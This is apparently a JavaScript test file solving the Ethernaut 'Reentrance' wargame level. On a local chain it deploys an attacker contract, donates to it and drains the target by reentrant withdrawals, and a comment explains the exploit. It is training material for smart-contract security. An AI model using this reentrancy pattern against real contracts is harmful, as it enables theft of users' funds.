const ReentranceFactory = artifacts.require('./levels/ReentranceFactory.sol')
const Reentrance = artifacts.require('./levels/Reentrance.sol')
const ReentranceAttacker = artifacts.require('./attacks/N10ReentranceAttacker.sol')
const utils = require('../utils/TestUtils')
const { expect } = require("chai")


describe("Challenge 10 - Reentrance", function () {
    let ethernaut
    let level
    let instance
    let attacker
    let maliciousContract

    const fundsToDonate = "0.001"

    async function createLevelInstance() {
        const [_attacker] = await web3.eth.getAccounts()
        attacker = _attacker

        ethernaut = await utils.getEthernautWithStatsProxy()
        level = await ReentranceFactory.new()

        await ethernaut.registerLevel(level.address)

        instance = await utils.createLevelInstance(
            ethernaut,
            level.address,
            attacker,
            Reentrance,
            { from: attacker, value: web3.utils.toWei(fundsToDonate, "ether") }
        )
    }

    before(createLevelInstance)

    describe("Initial State", function () {
        it("target contract has funds", async function () {
            expect(await utils.getBalance(web3, instance.address)).to.eq(fundsToDonate)
        })
    })

    describe("Attack Execution", function () {
        /*
            Target contract sends funds to the user first, and then once that is done,
            decrements the balances that user has with the contract.

            We will exploit this by creating a malicious contract which has
            a receive function that will call the withdraw function again, thus 
            creating a loop of withdrawals before code execution ever even comes
            to the first decrement statement.
        */
        it("donate small amount to attacker contract", async function () {
            maliciousContract = await ReentranceAttacker.new(instance.address)

            let maliciousContractBalance = await instance.balanceOf(maliciousContract.address)
            expect(web3.utils.fromWei(maliciousContractBalance)).to.eq("0")

            data = { from: attacker, value: web3.utils.toWei(fundsToDonate, "ether") }
            await instance.donate(maliciousContract.address, data)

            maliciousContractBalance = await instance.balanceOf(maliciousContract.address)
            expect(web3.utils.fromWei(maliciousContractBalance)).to.eq(fundsToDonate)
        })

        it("steal all funds", async function () {
            await maliciousContract.withdrawFunds(web3.utils.toWei(fundsToDonate, "ether"))
            const fundsPostExploit = await utils.getBalance(web3, maliciousContract.address)

            expect(Number(fundsPostExploit)).to.eq(2 * Number(fundsToDonate))
        })
    })

    describe("Ethernaut Validation", function () {
        it("level successfully validated by Ethernaut", async function () {
            const result = await utils.submitLevelInstance(
                ethernaut,
                level.address,
                instance.address,
                attacker
            )

            expect(result).to.be.true
        })
    })
})